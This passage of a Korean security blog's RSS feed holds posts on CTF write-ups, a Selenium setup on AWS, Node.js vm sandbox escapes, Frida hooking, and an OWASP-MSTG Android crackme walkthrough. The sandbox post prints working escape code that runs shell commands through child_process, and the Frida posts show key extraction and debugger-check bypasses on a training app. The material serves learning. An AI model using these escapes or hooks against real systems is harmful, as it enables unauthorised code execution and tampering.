      <description>&lt;h3 id=&quot;Post&quot;&gt;&lt;a href=&quot;#Post&quot; class=&quot;headerlink&quot; title=&quot;Post&quot;&gt;&lt;/a&gt;Post&lt;/h3&gt;&lt;p&gt;해당 게시글은 아래의 노션을 통해서 확인이 가능합니다.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://public.</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="Post"><a href="#Post" class="headerlink" title="Post"></a>Post</h3><p>해당 게시글은 아래의 노션을 통해서 확인이 가능합니다.</p><p><a href="https://public.jhyeon.dev/540fa8cc-458c-451c-a0d0-d614f5a57fb5">https://public.jhyeon.dev/540fa8cc-458c-451c-a0d0-d614f5a57fb5</a></p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/CTF/">CTF</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/CTF/">CTF</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
      
      <category domain="https://blog.jhyeon.dev/tags/CTFtime/">CTFtime</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Web-Hacking/">Web Hacking</category>
      
      <category domain="https://blog.jhyeon.dev/tags/UMassCTF-21/">UMassCTF&#39;21</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/03/29/umassctf-210329/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>AWS EC2 환경에서 Selenium(ChromeDriver) 활용하기</title>
      <link>https://blog.jhyeon.dev/2021/03/25/awschrome-210325/</link>
      <guid>https://blog.jhyeon.dev/2021/03/25/awschrome-210325/</guid>
      <pubDate>Wed, 24 Mar 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h2&gt;&lt;p&gt;최근에 AWS EC2, Ubuntu CLI 환경에서 Selenium을 활용할 일이 있었는데 그 과정을 정</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>최근에 AWS EC2, Ubuntu CLI 환경에서 Selenium을 활용할 일이 있었는데 그 과정을 정리해놓고 나중에 써먹고자</p><p>아래의 글을 정리한다.</p><h3 id="Install-Package"><a href="#Install-Package" class="headerlink" title="Install Package"></a>Install Package</h3><p>우선 chromedriver를 사용하기 전 크롬과 관련된 패키지를 설치 해줘야 한다.</p><pre><code class="bash">sudo apt updatesudo apt install wget unzipecho &quot;deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main&quot; &gt;&gt; /etc/apt/sources.listwget https://dl.google.com/linux/linux_signing_key.pubsudo apt install gnupgsudo apt-key add linux_signing_key.pubsudo apt install google-chrome-stable</code></pre><p>여기까지가 관련 패키지들을 설치해주는 명령어이다. 그 다음은 selenium 설치 과정이다.</p><p>pip로 selenium을 설치해주면 끝나서 간편하다.</p><pre><code class="bash">pip3 install --user selenium</code></pre><p>이렇게만 설치한다고 끝이 아닌, 크롬 공식 홈페이지에서 driver를 다운 받아줘야 한다.</p><p><a href="http://chromedriver.chromium.org/downloads">http://chromedriver.chromium.org/downloads</a></p><p>위 사이트에서 크롬 브라우저의 버전을 선택하여 wget으로 내려 받은 뒤 실행 파일을 사용하면 된다.</p><pre><code class="bash">wget https://chromedriver.storage.googleapis.com/89.0.4389.23/chromedriver_linux64.zipunzip chromedriver_linux64.zip</code></pre><h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><p>이렇게 설치했으면 크롬 브라우저를 어떻게 활용하냐, python 기준으로 예제 코드는 다음과 같다.</p><p>사실, 크롬 브라우저가 메모리를 되게 먹기 때문에 multiprocessing 처리를 하는 방식 등으로 사용하면 좋을 듯 하다.</p><p>메모리를 좀 줄여보겠다고 gpu, headless 등 각종 옵션을 넣긴 했지만 자체적으로 메모리를 많이 써서 큰 도움은 안되는 듯 하다.</p><pre><code class="py">#!/usr/bin/python3from selenium import webdriverfrom selenium.webdriver.chrome.options import Optionsdef openbr():    url = &quot;&quot;    options = webdriver.ChromeOptions()    options.add_argument(&#39;--headless&#39;)    options.add_argument(&#39;--no-sandbox&#39;)    options.add_argument(&#39;--disable-dev-shm-usage&#39;)    options.add_argument(&quot;--disable-gpu&quot;)    options.add_argument(&quot;--disable-infobars&quot;)    browser = webdriver.Chrome(chrome_options=options, executable_path=&quot;./chromedriver&quot;)    browser.get(url)    html = browser.page_source    return htmlif __name__ == &quot;__main__&quot;:    try:        openbr()    except Exception as excepterr:        logging~~</code></pre>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/AWS/">AWS</category>
      
      <category domain="https://blog.jhyeon.dev/tags/EC2/">EC2</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Ubuntu-CLI/">Ubuntu CLI</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Selenium/">Selenium</category>
      
      <category domain="https://blog.jhyeon.dev/tags/ChromeDriver/">ChromeDriver</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/03/25/awschrome-210325/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Node.JS VM Module Sandbox Escape Research</title>
      <link>https://blog.jhyeon.dev/2021/03/08/nodejs-vmescape/</link>
      <guid>https://blog.jhyeon.dev/2021/03/08/nodejs-vmescape/</guid>
      <pubDate>Sun, 07 Mar 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;1-Node-JS&quot;&gt;&lt;a href=&quot;#1-Node-JS&quot; class=&quot;headerlink&quot; title=&quot;[1] Node.JS&quot;&gt;&lt;/a&gt;[1] Node.JS&lt;/h3&gt;&lt;p&gt;Node.JS는 네트워크 애플리케이션(서버 사이드) 개발에 사용되는 </description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="1-Node-JS"><a href="#1-Node-JS" class="headerlink" title="[1] Node.JS"></a>[1] Node.JS</h3><p>Node.JS는 네트워크 애플리케이션(서버 사이드) 개발에 사용되는 소프트웨어 플랫폼입니다.</p><p>Javascript 언어를 사용하며, Non-blocking I/O와 단일 스레드 이벤트 루프를 사용하여 높은 처리 성능을 가지고 있습니다.</p><p>또한, HTTP 라이브러리를 내장하고 있어 웹 서버 구동에 필요한 Apache, Nginx와 같이 별도의 소프트웨어를 필요로 하지 않습니다.</p><hr><h3 id="2-Sandbox"><a href="#2-Sandbox" class="headerlink" title="[2] Sandbox"></a>[2] Sandbox</h3><p>Sandbox란, 외부에서 코드를 실행하거나 신뢰할 수 없는 코드를 안전하게 실행할 수 있도록 메인 시스템과 격리된 환경에서 실행되는 환경입니다.</p><p>Node.JS 기준으로는 <code>vm</code> 모듈이 존재하는데, 해당 모듈에 대해서는 아래 목차에서 좀 더 세심하게 다뤄보겠습니다.</p><h3 id="3-Node-JS-VM-Module"><a href="#3-Node-JS-VM-Module" class="headerlink" title="[3] Node.JS VM Module"></a>[3] Node.JS VM Module</h3><p>우선, Node JS에서는 임의의 JS 코드를 안전한 환경에서 실행될 수 있도록 하기 위해 <code>VM</code> 모듈을 제공하고</p><p>있습니다. 해당 모듈은 V8 가상 머신 컨택스트 내에서 코드를 컴파일하고 실행합니다.</p><p>물론, 해당 모듈이 안전하다고 볼수도 없습니다. 신뢰할 수 없는 코드나 임의의 코드를 실행할 수 있게 하지만 이러한 코드에서</p><p>Sandbox 환경을 escape하는 경우가 발생할 때는 시스템에 치명적인 영향을 미칠 수 있기 때문입니다.</p><p>아래는 VM 모듈에 대한 공식 문서 Sample Code 자료입니다.</p><pre><code class="js">const vm = require(&#39;vm&#39;);const x = 1;const context = &#123; x: 2 &#125;;vm.createContext(context); // Contextify the object.const code = &#39;x += 40; var y = 17;&#39;;// `x` and `y` are global variables in the context.// Initially, x has the value 2 because that is the value of context.x.vm.runInContext(code, context);console.log(context.x); // 42console.log(context.y); // 17console.log(x); // 1; y is not defined.</code></pre><h3 id="4-Run-VM-Module-Script"><a href="#4-Run-VM-Module-Script" class="headerlink" title="[4] Run VM Module Script"></a>[4] Run VM Module Script</h3><p>위 예제처럼, VM 모듈을 사용하여 스크립트를 실행하는 방법은 공식 문서에 함수 표현식 옵션이 몇 가지 존재합니다.</p><ul><li>script.runInContext(contextifiedObject[, options])</li></ul><pre><code class="js">const vm = require(&#39;vm&#39;)const context = &#123;  id: &#39;name&#39;,  price: 10000&#125;;const script = new vm.Script(&#39;price += 10000&#39;);vm.createContext(context);script.runInContext(context);console.log(context);/** result : 20000 **/</code></pre><ul><li>script.runInNewContext([contextObject[, options]])</li></ul><pre><code class="js">const vm = require(&#39;vm&#39;)const script = new vm.Script(&#39;variable = &quot;test&quot;&#39;);const context = [&#123;&#125;, &#123;&#125;];context.forEach((context) =&gt; &#123;    script.runInNewContext(context);&#125;);console.log(context);/** result [ &#123; variable: &#39;test&#39; &#125;, &#123; variable: &#39;test&#39; &#125; ] **/</code></pre><ul><li>script.runInThisContext([options])</li></ul><pre><code class="js">const vm = require(&#39;vm&#39;)global.variable = 0;const script = new vm.Script(&#39;variable += 1&#39;);for(let i=0; i&lt;1000; i++)&#123;    script.runInThisContext();&#125;console.log(variable);/** result : 1000 **/</code></pre><ul><li>vm.createContext([contextObject[, options]])</li></ul><pre><code class="js">const vm = require(&#39;vm&#39;);global.globalVar = 3;const context = &#123; globalVar: 1 &#125;;vm.createContext(context);vm.runInContext(&#39;globalVar *= 2;&#39;, context);console.log(context);// Prints: &#123; globalVar: 2 &#125;console.log(global.globalVar);// Prints: 3</code></pre><ul><li>vm.runInContext(code, contextifiedObject[, options])</li></ul><pre><code class="js">const vm = require(&#39;vm&#39;);const obj = &#123; globalvar: 1 &#125;;vm.createContext(obj);for(let i=0; i&lt;500; i++)&#123;    vm.runInContext(&#39;globalvar += 1&#39;, obj);&#125;console.log(obj);/** result : 501 **/</code></pre><ul><li>vm.runInNewContext(code[, contextObject[, options]])</li></ul><pre><code class="js">const vm = require(&#39;vm&#39;);const contextObject = &#123;  animal: &#39;cat&#39;,  count: 2&#125;;vm.runInNewContext(&#39;count += 1; name = &quot;kitty&quot;&#39;, contextObject);console.log(contextObject);// Prints: &#123; animal: &#39;cat&#39;, count: 3, name: &#39;kitty&#39; &#125;</code></pre><ul><li>vm.runInThisContext(code[, options])</li></ul><pre><code class="js">const vm = require(&#39;vm&#39;);let localVar = &#39;initial value&#39;;const vmResult = vm.runInThisContext(&#39;localVar = &quot;vm&quot;;&#39;);console.log(`vmResult: &#39;$&#123;vmResult&#125;&#39;, localVar: &#39;$&#123;localVar&#125;&#39;`);// Prints: vmResult: &#39;vm&#39;, localVar: &#39;initial value&#39;const evalResult = eval(&#39;localVar = &quot;eval&quot;;&#39;);console.log(`evalResult: &#39;$&#123;evalResult&#125;&#39;, localVar: &#39;$&#123;localVar&#125;&#39;`);// Prints: evalResult: &#39;eval&#39;, localVar: &#39;eval&#39;</code></pre><h3 id="5-Escaping-for-VM-Module"><a href="#5-Escaping-for-VM-Module" class="headerlink" title="[5] Escaping for VM Module"></a>[5] Escaping for VM Module</h3><p>최근에 CTF를 자주 참여하는 편인데 이번 zer0ctf 2021 CTF에서 해당 문제가 나왔었는데, 풀이 관련은 추후 정리가 완료되는대로 별도의 포스팅을 해볼 예정입니다.</p><p>우선 [2]에서도 설명 했듯이 VM 모듈을 사용할 때 신뢰할 수 없는 코드, 임의의 코드를 실행할 수 있게 되는 경우 이러한 환경을 탈출할 수 있고,</p><p>VM Context 외부의 객체를 통해 시스템에 치명적인 영향을 끼칠 수 있습니다.</p><p>아래는 일반적인 vm script 코드이며, bypass가 가능한 상황과 비교해보겠습니다.</p><pre><code class="js">const vm = require(&#39;vm&#39;);const msg = vm.runInNewContext(`&quot;use strict&quot;; let a = &quot;hello world&quot;; a;`, Object.create(null), &#123;timeout: 500&#125;);console.log(msg);</code></pre><p><code>escape1.js</code></p><pre><code class="js">const vm = require(&#39;vm&#39;);const cmd = vm.runInNewContext(`&quot;use strict&quot;; this.constructor.constructor(&#39;return this.process&#39;)()`, Object.create(null), &#123;timeout: 500&#125;);console.log(cmd);</code></pre><p><code>escape_rce.js</code></p><pre><code class="js">const vm = require(&#39;vm&#39;);const cmd = vm.runInNewContext(`&quot;use strict&quot;; const process = this.constructor.constructor(&#39;return this.process&#39;)(); process.mainModule.require(&#39;child_process&#39;).execSync(&#39;cat ./hellopoc&#39;).toString()`);console.log(cmd);</code></pre><img src="/img/post/nodejs_escape/1.png" class="lazyload" data-srcset="/img/post/nodejs_escape/1.png" srcset="data:image/png;base64,666"><p>위와 같이 sandbox 환경을 escape하여 RCE를 진행할 수 있게 됩니다.</p><p>물론 해당 방법 이외에도 다양한 bypass technology 들이 존재하나, 추후 여건이 되면 심화적인 접근을 다뤄보겠습니다.</p><p>참고하고 공부할 만한 링크는 아래 정리해두겠습니다.</p><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><p><a href="https://nodejs.org/api/vm.html">https://nodejs.org/api/vm.html</a></p></li><li><p><a href="https://millermedeiros.github.io/mdoc/examples/node_api/doc/vm.html">https://millermedeiros.github.io/mdoc/examples/node_api/doc/vm.html</a></p></li><li><p><a href="https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html">https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html</a></p></li><li><p><a href="https://blog.netspi.com/escape-nodejs-sandboxes/">https://blog.netspi.com/escape-nodejs-sandboxes/</a></p></li></ul>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Research/">Research</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/NodeJS/">NodeJS</category>
      
      <category domain="https://blog.jhyeon.dev/tags/V8-Engine/">V8 Engine</category>
      
      <category domain="https://blog.jhyeon.dev/tags/VM-Module/">VM Module</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Sandbox/">Sandbox</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Code-Execution/">Code Execution</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/03/08/nodejs-vmescape/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>AeroCTF 2021 Write up</title>
      <link>https://blog.jhyeon.dev/2021/02/28/aeroctf2021-210228/</link>
      <guid>https://blog.jhyeon.dev/2021/02/28/aeroctf2021-210228/</guid>
      <pubDate>Sat, 27 Feb 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;이번에 팀원분들과 함께 CTF를 진행하였습니다. 제가 푼 문제는 아래 노션에 풀이가 작성되어 있습니다!&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://public.jhyeon.dev/e08f5543-0769-4404-a7fa-2e7b5a28b66e&quot;</description>
        
      
      
      
      <content:encoded><![CDATA[<p>이번에 팀원분들과 함께 CTF를 진행하였습니다. 제가 푼 문제는 아래 노션에 풀이가 작성되어 있습니다!</p><p><a href="https://public.jhyeon.dev/e08f5543-0769-4404-a7fa-2e7b5a28b66e">https://public.jhyeon.dev/e08f5543-0769-4404-a7fa-2e7b5a28b66e</a></p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/CTF/">CTF</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/CTF/">CTF</category>
      
      <category domain="https://blog.jhyeon.dev/tags/AeroCTF2021/">AeroCTF2021</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/02/28/aeroctf2021-210228/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Frida를 통한 앱 내부 라이브러리 후킹 방법</title>
      <link>https://blog.jhyeon.dev/2021/02/22/frida-hook1-210222/</link>
      <guid>https://blog.jhyeon.dev/2021/02/22/frida-hook1-210222/</guid>
      <pubDate>Sun, 21 Feb 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;이번에, 앱을 분석해보다가 특정 라이브러리에 대해 후킹을 해야 하는 상황이 있었는데, 그 방법론을 기억에 남기고자&lt;/p&gt;
&lt;p&gt;아래 작성합니다.&lt;/p&gt;
&lt;p&gt;우선, 뭐든지 공식 문서에는 답이 매우 잘 나와있습니다.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;h</description>
        
      
      
      
      <content:encoded><![CDATA[<p>이번에, 앱을 분석해보다가 특정 라이브러리에 대해 후킹을 해야 하는 상황이 있었는데, 그 방법론을 기억에 남기고자</p><p>아래 작성합니다.</p><p>우선, 뭐든지 공식 문서에는 답이 매우 잘 나와있습니다.</p><p><a href="https://frida.re/docs/javascript-api/#interceptor">https://frida.re/docs/javascript-api/#interceptor</a></p><p>해당 라인을 보시면, <code> Interceptor.attach </code> 를 통해서 특정 함수의 호출을 catch할 수 있고,</p><p>함수의 주소를 가져오거나, 후킹을 진행할 수 있게됩니다.</p><p>아래는 예제 코드입니다.</p><pre><code class="java">Interceptor.attach(Module.findExportByName(&quot;라이브러리 파일&quot;, &quot;함수명&quot;), &#123;    onEnter: function(args)&#123;        this.input = Memory.readUtf8String(args[0]);            //input    &#125;,    onLeave: function(retval)&#123;        return 0;    &#125;&#125;</code></pre><p>물론 dlopen 함수 후킹을 통해 라이브러리가 로드되는 시점을 후킹할 수도 있습니다.</p><pre><code class="java">Interceptor.attach(Module.findExportByName(null, &quot;dlopen&quot;), &#123;    onEnter: function(args)&#123;        this.input = Memory.readUtf8String(args[0]);        if(this.input.indexOf(&quot;lib64.so&quot;) !== -1)&#123;            console.log(&quot;lib64.so Loaded!&quot;);            Thread.sleep(5);        &#125;    &#125;,    onLeave: function(retval)&#123;        return 0;    &#125;&#125;</code></pre><p>이러한 방법도 있고 앞으로 앱 관련 분석을 해보면서, 조금 더 심화적인 것들을 많이 연구해보고 또 글을 쓰도록 하겠습니다.</p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Mobile/">Mobile</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Android/">Android</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Application/">Application</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Penetration/">Penetration</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Frida/">Frida</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Hooking/">Hooking</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/02/22/frida-hook1-210222/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>(추가) 해킹캠프(HACKINGCAMP) 22기 운영 후기</title>
      <link>https://blog.jhyeon.dev/2021/02/21/hcamp22th/</link>
      <guid>https://blog.jhyeon.dev/2021/02/21/hcamp22th/</guid>
      <pubDate>Sat, 20 Feb 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;먼저, 해킹캠프에 대해서 궁금하신 분들이 있을 수 있기 때문에 아래 간략하게 설명을 남긴다.&lt;/p&gt;
&lt;h3 id=&quot;해킹캠프란&quot;&gt;&lt;a href=&quot;#해킹캠프란&quot; class=&quot;headerlink&quot; title=&quot;해킹캠프란?&quot;&gt;&lt;/a&gt;해킹캠프란?&lt;/h3&gt;</description>
        
      
      
      
      <content:encoded><![CDATA[<p>먼저, 해킹캠프에 대해서 궁금하신 분들이 있을 수 있기 때문에 아래 간략하게 설명을 남긴다.</p><h3 id="해킹캠프란"><a href="#해킹캠프란" class="headerlink" title="해킹캠프란?"></a>해킹캠프란?</h3><p>해킹캠프는 해킹과 보안에 관심을 가지고 있는 국내 학생들을 위해 국제 해킹·보안 컨퍼런스 POC(POC SECURITY 주관)가 운영하는 해킹·보안 캠프입니다.</p><p><a href="https://hackingcamp.org/">https://hackingcamp.org</a></p><h3 id="Agenda"><a href="#Agenda" class="headerlink" title="Agenda"></a>Agenda</h3><ul><li><p>발표 세션</p><ul><li>악성코드로 알아보는 사이버 크라임 갱(부제: 코인 떡상과 발표자의 피땀눈물) / 안소희 발표자님</li><li>버그바운티 어서오고(부제: CTF Vs Bug Bounty) / 유동현 발표자님</li><li>퍼징의 이해 및 실습 / 장대희 발표자님</li><li>Fun, Cool, Sexy 하게 해킹하기 (네트워크, 웹 프로토콜 분석 방법) / 장한빈 발표자님</li><li>웹 취약점 스캐너 / 김주원 발표자님</li><li>CodeQL Analysis / 홍승표 발표자님</li></ul></li><li><p>이벤트 세션</p><ul><li>숙명여대 정보보호동아리 SISS 퀴즈 이벤트</li><li>해킹캠프CTF</li><li>Demon Q&amp;A (데몬팀 멤버들에게 궁금한 것들 질답하는 시간)</li></ul></li></ul><p>전체적인 Agenda는 위와 같이 구성이 되었습니다. 저 역시도 발표자분들이 진행해주시는 발표 내용을 들으면서,</p><p>유익한 지식도 많이 알게 되었습니다. 중간중간 퀴즈를 진행해주시는 SISS 분들도 고생을 많이 하셨고 재밌었던 것 같습니다.</p><p>다음은 데몬팀에서 준비한 해킹캠프 CTF에 잠깐 리뷰를 해드리겠습니다.</p><p>저를 포함한 데몬팀에서 활동하시는 분들께서 <code> 웹, 포너블, 리버싱, 미스크 </code> 분야로 총 20개의 문제를 준비하셨고,</p><p>대회 중에는 큰 문제없이 잘 끝냈던 것 같습니다. (아마도..)</p><p>사실, 중간중간 제가 출제한 문제에 대해서 버그랑 오류가 확인되었는데 자리를 잠깐 비운사이에 문제가 생겼더군요 ㅠ_ㅠ</p><p>하지만 빠르게 인지하고 수정한 덕분에 참가자분들이 혼란없이 문제를 풀이하실 수 있었던 것 같습니다.</p><p>(앞으로, 조금 더 신경쓰면서 문제를 만들고 관리해야 겠습니다!!)</p><p>마지막으로, 20:00 ~ 02:00 (6시간) 동안 진행된 대회의 결과는 아래 사진을 첨부합니다.</p><img src="/img/post/hcamp22/hcamp.png" class="lazyload" data-srcset="/img/post/hcamp22/hcamp.png" srcset="data:image/png;base64,666"><p>코로나19 여파로 인해 온라인 진행이였음에도 불구하고 많은 관심을 가지고 참여해주신 참가자분들에게 감사의 인사를 전달드리고 싶고,</p><p>POC 관계자분들, SISS, DEMON 팀원 모두 고생하셨습니다.</p><p>올해 하반기에 있을 해킹캠프에도 많은 관심을 가져주셨으면 좋겠습니다!</p><h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><p>2/22 00:00 ~ 3/1 23:59분까지 해킹캠프 CTF에 관심이 있으신 분들이 많을 것으로 예상되어,</p><p>해당 기간동안 CTF 사이트를 공개합니다! 많은 관심 가져주시고 올해 하반기에 있을 제 23회 해킹캠프에도 많이 참여해주세요~~</p><p><a href="https://ctf.hackingcamp.org/">https://ctf.hackingcamp.org</a></p><p>이상. 글을 마치겠습니다.</p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Memo/">Memo</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/HCAMP/">HCAMP</category>
      
      <category domain="https://blog.jhyeon.dev/tags/HACKINGCAMP/">HACKINGCAMP</category>
      
      <category domain="https://blog.jhyeon.dev/tags/%EC%A0%95%EB%B3%B4-%EB%B3%B4%EC%95%88/">정보 보안</category>
      
      <category domain="https://blog.jhyeon.dev/tags/%ED%95%B4%ED%82%B9%EC%BA%A0%ED%94%84/">해킹캠프</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/02/21/hcamp22th/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>안드로이드 앱 모의해킹(OWASP-MSTG) LEVEL 2 풀이</title>
      <link>https://blog.jhyeon.dev/2021/02/14/owsap-mstg-level2-210214/</link>
      <guid>https://blog.jhyeon.dev/2021/02/14/owsap-mstg-level2-210214/</guid>
      <pubDate>Sat, 13 Feb 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;LEVEL-2&quot;&gt;&lt;a href=&quot;#LEVEL-2&quot; class=&quot;headerlink&quot; title=&quot;LEVEL 2&quot;&gt;&lt;/a&gt;LEVEL 2&lt;/h2&gt;&lt;p&gt;앞 포스팅에 이어서 LEVEL 2단계 어플리케이션 분석을 진행하겠습니다.&lt;/p&gt;
&lt;img </description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="LEVEL-2"><a href="#LEVEL-2" class="headerlink" title="LEVEL 2"></a>LEVEL 2</h2><p>앞 포스팅에 이어서 LEVEL 2단계 어플리케이션 분석을 진행하겠습니다.</p><img src="/img/post/android_penetration2/1.png" class="lazyload" data-srcset="/img/post/android_penetration2/1.png" srcset="data:image/png;base64,666"><img src="/img/post/android_penetration2/2.png" class="lazyload" data-srcset="/img/post/android_penetration2/2.png" srcset="data:image/png;base64,666"><p>APK 디컴파일 이후 MainActivity 구조를 보면 LEVEL1 단계에서 분석을 했던 것과 크게 차이는 없지만,</p><p>두 가지 변경 사항이 있습니다.</p><ol><li><p>Static Library 호출(foo)</p></li><li><p>AsyncTask 클래스 추가</p></li></ol><p>먼저 1번의 내용부터 보면 코드 내에서 foo라는 라이브러리를 호출하고 있습니다. 이는 라이브러리에서 함수를 정의해서 사용하는 의미가 있습니다.</p><p>그리고 AsyncTask의 역할은 백그라운드 작업인데, 디버깅 여부 탐지 로직에 들어간것으로 보아 백그라운드에서 돌아가면서 주기적으로 체크를 하는 것입니다.</p><p>아마도 이번 문제는 호출하는 라이브러리까지 타고 들어가서 코드를 분석해야만 풀리지 않을까라는 개인적인 생각을 합니다.</p><img src="/img/post/android_penetration2/3.png" class="lazyload" data-srcset="/img/post/android_penetration2/3.png" srcset="data:image/png;base64,666"><p>일단 이번앱에서도 Secret String 값을 찾아야 하는데, CodeCheck 메서드를 봤을 때 사진과 같이 smail 코드에선 아무런 내용이 작성되어 있지 않습니다.</p><p>다만, native method로 bar() 함수를 호출시켜서 동작하고 있는 것은 알 수 있습니다.</p><pre><code class="java">public class CodeCheck &#123;    private native boolean bar(byte[] bArr);    public boolean a(String str) &#123;        return bar(str.getBytes());    &#125;&#125;</code></pre><p>native method는 간단히, 리눅스 운영체제의 library(so) 파일을 로드해서 사용하는 것인데,</p><p>자세한 사항은 아래 링크에 정리가 잘 되어 있어서 참고하면 좋을 것 같다.</p><ul><li><a href="https://minhyeokism.tistory.com/27">https://minhyeokism.tistory.com/27</a></li></ul><img src="/img/post/android_penetration2/4.png" class="lazyload" data-srcset="/img/post/android_penetration2/4.png" srcset="data:image/png;base64,666"><p>그럼 이 라이브러리가 어디있을까?</p><p>APK 압축풀면 lib 폴더에 각 운영체제 환경별로 .so 라이브러리 파일이 있는데, 본인의 환경에 맞는 so만 분석하면 된다.</p><p>IDA로 해당 라이브러리 파일을 열어서 CodeCheck 메서드를 확인해보면, 사진과 같이 키 값을 확인할 수 있다.</p><img src="/img/post/android_penetration2/5.png" class="lazyload" data-srcset="/img/post/android_penetration2/5.png" srcset="data:image/png;base64,666"><p>그런데 후킹을 하지 않고 이렇게 코드 분석으로만 풀 수 있었던가.. 라는 생각을해서 후킹을 통해서도 값을 얻어보기로 했다.</p><p>이번에 후킹할 때는 native code로 작성된 것을 후킹해야 하기 때문에 frida의 <code> interceptor </code> 기능을 사용해야 한다.</p><ul><li><a href="https://frida.re/docs/javascript-api/#interceptor">https://frida.re/docs/javascript-api/#interceptor</a></li></ul><p><code> Interceptor.attach(target, callbacks) </code> 과 같이 사용하는데 target에 so 라이브러리와</p><p>callbacks엔 Module.getExportByName()로 메서드를 넣어주면 된다.</p><pre><code class="java">        Interceptor.attach(Module.getExportByName(&quot;libfoo.so&quot;, &quot;strncmp&quot;), &#123;            onEnter: function(args)&#123;                if(args[2].toInt32() == 23 &amp;&amp; Memory.readCString(args[0], 23) == &quot;12345678901234567890123&quot;)&#123;                    console.log(&quot;Find Key! : &quot; + Memory.readCString(args[1]));                &#125;            &#125;        &#125;)</code></pre><p>코드는 그렇게 어렵진 않고, libfoo.so 라이브러리 내 strncmp에 접근해서 onEnter 이벤트가 발생하면, 코드를 실행하도록 구조를 만들었다.</p><p><code> args[2].toInt32() == 23 </code> 처리를 해준 이유는 strncmp 함수를 실행하는 조건에 입력값 길이가 23을 만족해야 된다.</p><p>그래서 args[0] = 사용자 입력값에 23길이가 채워지면 <code> Memory.readCString() </code> 함수로 메모리에서 값을 읽도록 하였고, 아래와 같이</p><p>정상적으로 키 값을 얻어낼 수 있었다.</p><img src="/img/post/android_penetration2/6.png" class="lazyload" data-srcset="/img/post/android_penetration2/6.png" srcset="data:image/png;base64,666"><img src="/img/post/android_penetration2/7.png" class="lazyload" data-srcset="/img/post/android_penetration2/7.png" srcset="data:image/png;base64,666"><p>근데, 중간중간에 디버깅 우회 로직을 안짜놔서 디버깅 탐지도 자꾸 되길래 임시 방편으로다가 후킹을 걸어놓았는데, 단순 임시방편이라..</p><p>다음편에는 안드로이드 어플리케이션 디버깅 우회 관련 포스팅을 작성해보고자 한다.</p><pre><code class="java">            debug_class.isDebuggerConnected.implementation = function()&#123;                console.log(&quot;Debug Hooked!&quot;);                return true;            &#125;</code></pre>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Mobile/">Mobile</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Android/">Android</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Application/">Application</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Penetration/">Penetration</category>
      
      <category domain="https://blog.jhyeon.dev/tags/OWASP-MSTG/">OWASP-MSTG</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/02/14/owsap-mstg-level2-210214/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>안드로이드 앱 모의해킹(OWASP-MSTG) 풀이</title>
      <link>https://blog.jhyeon.dev/2021/02/13/owasp-mstg-210131/</link>
      <guid>https://blog.jhyeon.dev/2021/02/13/owasp-mstg-210131/</guid>
